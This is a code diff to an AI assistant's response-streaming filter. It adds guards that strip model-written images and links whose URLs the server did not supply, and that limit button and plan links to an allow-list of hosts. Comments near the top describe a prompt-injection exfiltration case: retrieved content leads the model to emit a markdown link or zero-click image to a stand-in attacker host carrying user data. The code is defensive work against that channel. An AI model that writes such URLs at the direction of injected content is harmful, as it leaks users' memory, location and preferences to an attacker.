@@ -28,6 +28,8 @@ import { SHOPPING_GAP_WORDS } from '@/lib/ai/consultative/shoppingConstraints'
 const CARDS_SHOWN = 3
 import { renderCtaBlock, stripModelCta } from '@/lib/recommendation/cta'
 import { unlinkMislabelledMerchantLinks, validateModelCtaBlock, stripFalseDisconnectClaims, unemphasizeLinks } from '@/lib/recommendation/ctaValidation'
+import { PROVIDER_REGISTRY } from '@/lib/ccp'
+import { searchTemplates } from '@/lib/ccp/adapters'
 import { actionTranslator } from '@/lib/recommendation/actionLabel'
 import { entertainmentCapabilityOf, requestedProviderOf } from './tools/commerceIntent'
 import { suppressUngroundedVenues, isGrounded, normalizeHeading, isVenueHeading, type PlaceSearchStatus } from './groundingGate'
@@ -402,6 +404,219 @@ export function dropOrphanedEnrichment(places: PlaceLike[], text: string): { tex
 function stripUnvalidatedTikTokLinks(text: string, owned: Owned): string {
   return text.replace(/\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g, (whole, label: string, url: string) =>
     /(^|\.)tiktok\.com$/.test(domainOf(url)) && !owned.tiktokUrls.has(url) ? label : whole)
+}
+
+// ════════════════════════════════════════════════════════════════════════════════════════════
+// P3-F2 / P3-F4 / P3-F5 — EGRESS: the model may publish a URL only by COPYING one it was given.
+// ════════════════════════════════════════════════════════════════════════════════════════════
+// Restored 2026-09-25 from integration/v3-foundation (a711181 images, 66e4c46 links/CTA/plan),
+// which never reached the shipping branch. Measured on this branch before the restore: a link
+// the model invented (`[Xem thêm](https://attacker.example/collect?d=<user data>)`) and a
+// markdown image to an arbitrary host both reached the client unmodified; web renders
+// `![..](url)` as <img> (CSP img-src allows any https: host) and Android renders it as a
+// gallery, so an image is a ZERO-CLICK exfiltration channel for everything in the turn's
+// context (memory, area, preferences) once retrieved content talks the model into writing one.
+//
+// Images: the system injects place photos and the rulebook forbids the model to write
+// `![...](...)`, so an image in model prose is either a copy of an owned photo (kept) or
+// invented (reduced to its alt text).
+// Links: the rulebook ORDERS the model to copy links out of tool results, so the property is
+// "publishable only if it appears byte-for-byte (after normalisation) in this turn's tool
+// results or in a reply we already published". An attacker can rank a URL into a result but
+// cannot get the victim's data into it — appending a payload breaks the match.
+// Structured blocks ([CTA_BUTTONS], [TAPPY_PLAN]) carry URLs the model CONSTRUCTS, so their
+// DESTINATION is constrained instead: a platform the product hands off to, or a turn URL.
+
+/**
+ * P3-F2 · Remove every markdown IMAGE whose URL the server did not source — reduced to its alt
+ * text (visible, readable), exactly as `stripUnvalidatedTikTokLinks` keeps a link's label.
+ */
+function stripUnownedImages(text: string, owned: Owned): string {
+  return text.replace(/!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g, (whole, alt: string, url: string) =>
+    isOwnedImageUrl(url, owned) ? whole : alt)
+}
+
+/** Every http(s) URL appearing in a string — used on raw tool-result frames. */
+const URL_IN_TEXT = /https?:\/\/[^\s"'<>()\\[\]]+/g
+
+export function extractUrls(text: string): string[] {
+  return text.match(URL_IN_TEXT) ?? []
+}
+
+/**
+ * The form two spellings of the same URL are compared in: percent-decoded (the markdown copy is
+ * encoded by `sanitizeUrlForMarkdown`, the tool JSON is raw), trailing sentence punctuation
+ * dropped, lower-cased.
+ */
+function normalizeUrl(url: string): string {
+  return decodeSafe(url).replace(/[.,;:!?]+$/, '').toLowerCase()
+}
+
+/**
+ * P3-F5 · where a model-CONSTRUCTED button or plan link may point. The original list (the
+ * platforms the rulebook names) plus, since the shipping branch moved the hand-off set into the
+ * CCP registry, every registry merchant host and every search template the prompt hands the
+ * model — derived, so a platform added to the registry is not silently deleted here.
+ */
+const CTA_ALLOWED_HOSTS: readonly string[] = [...new Set([
+  // Food ordering, shopping, travel — the rulebook's original set.
+  'shopeefood.vn', 'grab.com', 'be.com.vn',
+  'shopee.vn', 'lazada.vn', 'tiki.vn',
+  'booking.com', 'agoda.com', 'xanhsm.com', 'traveloka.com',
+  // Maps, search, review video.
+  'google.com', 'goo.gl', 'youtube.com',
+  ...PROVIDER_REGISTRY.flatMap(e => e.allowedHosts),
+  ...searchTemplates().map(t => { try { return new URL(t.template.replace('{q}', 'x')).host } catch { return '' } }),
+].map(h => h.toLowerCase().replace(/^www\./, '')).filter(Boolean))]
+
+function isAllowedCtaHost(url: string): boolean {
+  const host = domainOf(url)
+  if (!host) return false
+  return CTA_ALLOWED_HOSTS.some(a => host === a || host.endsWith('.' + a))
+}
+
+/**
+ * May a structured block publish this URL? A named platform, or something this turn actually
+ * produced. A relative path has no host and satisfies neither — which is what stops
+ * `type:"internal_booking"` + `router.push(btn.url)` from becoming model-driven navigation.
+ */
+function isPublishableStructuredUrl(url: unknown, allowed: ReadonlySet<string>): boolean {
+  return typeof url === 'string' && (isAllowedCtaHost(url) || allowed.has(normalizeUrl(url)))
+}
+
+/**
+ * [TAPPY_PLAN] `maps_link` / `booking_link` are rendered as `href=` — same channel as a CTA
+ * button, same policy. The offending value is BLANKED (the card renders a link only when the
+ * field is non-empty), so the plan step survives.
+ */
+function guardPlanLinks(text: string, allowed: ReadonlySet<string>): string {
+  return text.replace(/(\[TAPPY_PLAN\])([\s\S]*?)(\[\/TAPPY_PLAN\]|$)/g, (whole, open: string, body: string, close: string) => {
+    try {
+      const plan = JSON.parse(body.trim()) as { days?: Array<{ items?: Array<Record<string, unknown>> }> }
+      if (!Array.isArray(plan.days)) return whole
+      let changed = false
+      for (const day of plan.days) {
+        for (const item of day?.items ?? []) {
+          for (const field of ['maps_link', 'booking_link'] as const) {
+            if (item[field] && !isPublishableStructuredUrl(item[field], allowed)) {
+              item[field] = ''
+              changed = true
+            }
+          }
+        }
+      }
+      return changed ? open + JSON.stringify(plan) + close : whole
+    } catch {
+      return whole
+    }
+  })
+}
+
+/**
+ * Drop CTA buttons pointing somewhere neither the hand-off set nor this turn justifies. A
+ * malformed payload is left alone — the clients parse it with the same JSON.parse and drop it.
+ */
+function guardCtaButtons(text: string, allowed: ReadonlySet<string>): string {
+  return text.replace(/(\[CTA_BUTTONS\])([\s\S]*?)(\[\/CTA_BUTTONS\]|$)/g, (whole, open: string, body: string, close: string) => {
+    try {
+      const parsed = JSON.parse(body.trim()) as { buttons?: Array<{ url?: unknown }> }
+      if (!Array.isArray(parsed.buttons)) return whole
+      const kept = parsed.buttons.filter(b => isPublishableStructuredUrl(b?.url, allowed))
+      if (kept.length === parsed.buttons.length) return whole
+      return open + JSON.stringify({ ...parsed, buttons: kept }) + close
+    } catch {
+      return whole
+    }
+  })
+}
+
+/**
+ * P3-F4 · Remove every PROSE link whose URL we did not give the model: a markdown link keeps its
+ * label, a bare URL is removed (formatMessage auto-links bare `https://…`, so ignoring them would
+ * be a bypass). Structured blocks are judged by their own policy, never by the prose rules —
+ * running the bare-URL pass over CTA JSON once deleted every button's `url` on a live turn.
+ * `allowed` undefined means "do not run".
+ */
+function stripUnownedLinks(text: string, allowed?: ReadonlySet<string>): string {
+  if (!allowed) return text
+  const cut = earliestMarker(text)
+  const prose = text.slice(0, cut)
+  const tail = text.slice(cut)
+  const withLinks = prose.replace(
+    /(?<!!)\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g,
+    (whole, label: string, url: string) => (allowed.has(normalizeUrl(url)) ? whole : label),
+  )
+  const guardedProse = withLinks.replace(
+    /(?<!\]\()https?:\/\/[^\s<>()\\[\]]+/g,
+    (url: string) => {
+      const trailing = url.match(/[.,;:!?]+$/)?.[0] ?? ''
+      const bare = trailing ? url.slice(0, -trailing.length) : url
+      return allowed.has(normalizeUrl(bare)) ? url : trailing
+    },
+  )
+  return guardedProse + guardPlanLinks(guardCtaButtons(tail, allowed), allowed)
+}
+
+/**
+ * The settle-path egress pass over the complete model text: un-owned images → alt text, un-given
+ * links → label, structured-block destinations constrained. Run BEFORE the system injects its
+ * own photos and links, so nothing the server writes is judged by it.
+ */
+function guardModelEgress(text: string, owned: Owned, allowed: ReadonlySet<string>): string {
+  return stripUnownedLinks(stripUnownedImages(text, owned), allowed)
+}
+
+/** Past this many characters an unclosed `[` / `![` / scheme is prose, not a token in flight. */
+const FORMING_IMAGE_LIMIT = 2048
+
+/**
+ * Where a link/image/URL token appears to still be arriving, or -1. The EARLIEST of: an unclosed
+ * `[` or `![`; a scheme with no whitespace after it (a bare URL mid-flight); a structured block
+ * that has begun (held whole until the stream ends so its policy sees a complete payload).
+ */
+function formingStart(text: string): number {
+  const marker = earliestMarker(text)
+  if (marker < text.length) return marker
+
+  const candidates: number[] = []
+  const bracket = text.lastIndexOf('[')
+  if (bracket !== -1 && !text.slice(bracket).includes(')')) {
+    candidates.push(bracket > 0 && text[bracket - 1] === '!' ? bracket - 1 : bracket)
+  }
+  const scheme = Math.max(text.lastIndexOf('http://'), text.lastIndexOf('https://'))
+  if (scheme !== -1 && !/[\s)]/.test(text.slice(scheme))) candidates.push(scheme)
+
+  if (candidates.length === 0) return -1
+  const from = Math.min(...candidates)
+  return text.length - from <= FORMING_IMAGE_LIMIT ? from : -1
+}
+
+/**
+ * P3-F2 on the LIVE path — the prefix of `text` that is safe to release NOW. A live turn
+ * (web_search, news, no tool at all — precisely the turns that pull in attacker-authored
+ * content) has had nothing injected, so no image in it is legitimate. Works on the ACCUMULATED
+ * text because a URL arrives across several deltas; withholds only a trailing, still-forming
+ * token. With no `[`/`![`/scheme in the text the result is the input, byte for byte, so an
+ * ordinary turn keeps its timing and frame count. Monotonic: what was releasable stays a prefix.
+ */
+export function releasableLiveText(
+  text: string,
+  endOfStream = false,
+  allowedUrls?: ReadonlySet<string>,
+): string {
+  if (!endOfStream) {
+    const from = formingStart(text)
+    if (from !== -1) return releasableLiveText(text.slice(0, from), true, allowedUrls)
+  }
+  const stripped = stripUnownedLinks(
+    text.replace(/!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g, (_whole, alt: string) => alt),
+    allowedUrls,
+  )
+  const proseEnd = earliestMarker(stripped)
+  const open = stripped.lastIndexOf('![', proseEnd)
+  if (open === -1 || open >= proseEnd) return stripped
+  if (endOfStream || stripped.length - open <= FORMING_IMAGE_LIMIT) return stripped.slice(0, open)
+  return stripped
 }
 
 function stripOwnedEnrichment(places: PlaceLike[], text: string): string {
@@ -1094,9 +1309,24 @@ export function applyPlaceEnrichmentStreamFilter(
   resolveTikTok?: TikTokResolver,
   /** The city the search was about, passed straight into the TikTok query. */
   tiktokLocation?: string,
+  /**
+   * P3-F4. Text of replies ALREADY PUBLISHED in this conversation, so a URL the user was
+   * legitimately shown can be repeated on a later turn that runs no tool ("cho mình xem lại link
+   * đặt vé"). Sound because those URLs passed this same guard when first emitted; a malicious
+   * client exfiltrating to itself already holds the data.
+   */
+  publishedHistory: string[] = [],
 ): Response {
   const body = response.body
   if (!body) return response
+
+  /**
+   * Every URL the model is allowed to publish this turn: what we already showed the user, plus
+   * whatever this turn's tool results contain (harvested from the raw `a:` frames below).
+   */
+  const allowedUrls = new Set<string>()
+  const allowUrl = (u: string) => allowedUrls.add(normalizeUrl(u))
+  for (const prior of publishedHistory) for (const u of extractUrls(prior)) allowUrl(u)
 
   const decoder = new TextDecoder()
   const encoder = new TextEncoder()
@@ -1302,6 +1532,49 @@ export function applyPlaceEnrichmentStreamFilter(
   let liveText = ''
 
   /**
+   * P3-F2. Exactly what the live path has already put on the wire, so the next release can send
+   * the difference. A STRING rather than a length because `releasableLiveText` can shorten what
+   * it returns (an image becomes its alt).
+   */
+  let liveReleased = ''
+
+  /**
+   * The one place live assistant text leaves this filter — the B12 step break and the model's
+   * own deltas both go through here, so the guard cannot be bypassed by whichever of them a
+   * future change touches. Releases only the prefix `releasableLiveText` vouches for, which for a
+   * turn with no link/image token is all of it, in the same frame.
+   */
+  const emitLive = (controller: TransformStreamDefaultController, addition: string) => {
+    liveText += addition
+    assistantSoFar += addition
+    const releasable = releasableLiveText(liveText, false, allowedUrls)
+    if (!releasable.startsWith(liveReleased) || releasable.length === liveReleased.length) return
+    const slice = releasable.slice(liveReleased.length)
+    liveReleased = releasable
+    controller.enqueue(encoder.encode('0:' + JSON.stringify(slice) + '\n'))
+  }
+
+  /** End of stream: a still-forming token is no longer forming — release what it turned out to be, sanitised. */
+  const flushLive = (controller: TransformStreamDefaultController) => {
+    if (bufferMode) return
+    const final = releasableLiveText(liveText, true, allowedUrls)
+    if (!final.startsWith(liveReleased) || final.length === liveReleased.length) return
+    controller.enqueue(encoder.encode('0:' + JSON.stringify(final.slice(liveReleased.length)) + '\n'))
+    liveReleased = final
+  }
+
+  /**
+   * P3-F2/F4 on the A5-P1 progressive release (buffered, before any place tool): never cut a
+   * link/image/URL token in half — stop the release where one is still forming — and release
+   * each slice through the same live egress rule (no image is owned before a place tool).
+   */
+  const egressPoint = (point: number): number => {
+    const from = formingStart(mainText.slice(0, point))
+    return from === -1 ? point : Math.min(point, from)
+  }
+  const egressSlice = (slice: string): string => releasableLiveText(slice, true, allowedUrls)
+
+  /**
    * F-043 — the risk-first backstop for second-hand purchase advice (`riskBackstop.ts`). One
    * function, two call sites: the buffered path applies it to the prose before the structured
    * blocks are appended; the live path (no tool, nothing buffered — exactly the T4 / G5 turns)
@@ -1466,6 +1739,17 @@ export function applyPlaceEnrichmentStreamFilter(
         // prose still go out below.
       }
     }
+
+    /**
+     * P3-F2/F4/F5 — the settle-path egress pass, over the COMPLETE model text, once: an image the
+     * server does not own becomes its alt text, a link this turn never handed the model becomes
+     * its label (a bare one goes), and [CTA_BUTTONS]/[TAPPY_PLAN] destinations are constrained.
+     * Here — after photos resolved (ownership is known) and BEFORE the injector and the card path
+     * split — so it covers the web card branch (`cardOwnsEnrichment` skips the injector) and the
+     * plan branch alike, and nothing the server writes afterwards is judged by it. The released
+     * progressive prefix went through the same rule (`egressSlice`), so it stays a prefix.
+     */
+    mainText = guardModelEgress(mainText, buildOwned(places), allowedUrls)
 
     /**
      * The card's payload, built here rather than at the end, because whether it
@@ -2352,9 +2636,9 @@ export function applyPlaceEnrichmentStreamFilter(
             // A5-P1: release the part that the guard provably cannot touch, instead of making the
             // user wait for the whole reply. Only before a place tool — see `progressive`.
             if (progressive && !placeToolSeen) {
-              const point = safeFlushPoint(mainText)
+              const point = egressPoint(safeFlushPoint(mainText))
               if (point > flushedText.length) {
-                const slice = unemphasizeLinks(mainText.slice(flushedText.length, point))
+                const slice = unemphasizeLinks(egressSlice(mainText.slice(flushedText.length, point)))
                 flushedText = mainText.slice(0, point)
                 flushedSent += slice
                 controller.enqueue(encoder.encode('0:' + JSON.stringify(slice) + '\n'))
@@ -2373,11 +2657,7 @@ export function applyPlaceEnrichmentStreamFilter(
             // bufferMode false, so its turn streams straight through and would run the two steps
             // together exactly the same way. The break is emitted as its own frame so the live
             // stream keeps its timing — nothing is held back.
-            if (needsBreak()) {
-              controller.enqueue(encoder.encode('0:' + JSON.stringify('\n\n') + '\n'))
-              liveText += '\n\n'
-              assistantSoFar += '\n\n'
-            }
+            if (needsBreak()) emitLive(controller, '\n\n')
             awaitingPostToolText = false
 
             let out = line
@@ -2387,16 +2667,16 @@ export function applyPlaceEnrichmentStreamFilter(
                 out = '0:' + JSON.stringify(cleaned)
               } catch { /* malformed delta — forward untouched */ }
             }
-            // Keep a copy of what went out, so presentation tracking works on
-            // turns where no tool ran. This is a RECORD, not a buffer: the
-            // chunk is enqueued on the next line either way, so nothing is held
-            // back and the live stream keeps its timing.
+            // Keep a copy of what went out, so presentation tracking works on turns where no tool
+            // ran. `emitLive` appends to `liveText` and releases everything P3-F2/F4 can prove is
+            // safe, which on a turn with no link/image token is the whole delta — same bytes, same
+            // frame, same timing as before the guard existed.
+            let delta: string | null = null
             try {
-              const delta = JSON.parse(out.slice(2)) as string
-              liveText += delta
-              assistantSoFar += delta
-            } catch { /* skip malformed */ }
-            controller.enqueue(encoder.encode(out + '\n'))
+              delta = JSON.parse(out.slice(2)) as string
+            } catch { /* malformed delta — forward untouched */ }
+            if (delta === null) controller.enqueue(encoder.encode(out + '\n'))
+            else emitLive(controller, delta)
           }
         } else if (line.startsWith('9:')) {
           try {
@@ -2409,9 +2689,9 @@ export function applyPlaceEnrichmentStreamFilter(
               // longer applies. Without this the common "one opening sentence, then the tool" shape
               // released nothing and the user still stared at ~13.6s of blank screen.
               if (progressive && !placeToolSeen) {
-                const point = safeFlushPoint(mainText, true)
+                const point = egressPoint(safeFlushPoint(mainText, true))
                 if (point > flushedText.length) {
-                  const slice = unemphasizeLinks(mainText.slice(flushedText.length, point))
+                  const slice = unemphasizeLinks(egressSlice(mainText.slice(flushedText.length, point)))
                   flushedText = mainText.slice(0, point)
                   flushedSent += slice
                   controller.enqueue(encoder.encode('0:' + JSON.stringify(slice) + '\n'))
@@ -2432,6 +2712,11 @@ export function applyPlaceEnrichmentStreamFilter(
           } catch { /* ignore */ }
           controller.enqueue(encoder.encode(line + '\n'))
         } else if (line.startsWith('a:')) {
+          // P3-F4. Harvest from the RAW frame, before any typed parse: every tool has its own
+          // result shape (search_url, booking_links, price_search_results[].link, order_links…),
+          // and a per-shape reader would miss the next one — failing CLOSED into deleting a
+          // legitimate link. Scanning the JSON text catches all of them.
+          for (const u of extractUrls(line)) allowUrl(u)
           try {
             const res = JSON.parse(line.slice(2)) as {
               toolCallId?: string
@@ -2713,6 +2998,8 @@ export function applyPlaceEnrichmentStreamFilter(
         } else if (line.startsWith('d:')) {
           // A1(b): the model is done; what follows is the guards, the photos and the card.
           if (bufferMode && placeToolSeen && !emitted) controller.enqueue(encoder.encode('8:' + JSON.stringify([buildProgressAnnotation('finishing', lang)]) + '\n'))
+          // P3-F2: release the live tail (a held-back token, sanitised) before anything else.
+          flushLive(controller)
           await emitReconstructed(controller)
           // Live path of the F-043 backstop: everything already streamed; only the appended
           // text is sent, as one frame, so the persisted message carries it too. Markers the
@@ -2730,6 +3017,8 @@ export function applyPlaceEnrichmentStreamFilter(
       }
     },
     async flush(controller) {
+      // P3-F2: a stream with no `d:` frame still gets its held-back live tail, sanitised.
+      flushLive(controller)
       await emitReconstructed(controller)
       if (lineRemainder) controller.enqueue(encoder.encode(lineRemainder + '\n'))
       // Task 3C: hand the turn's grounded evidence to the caller AFTER the reply
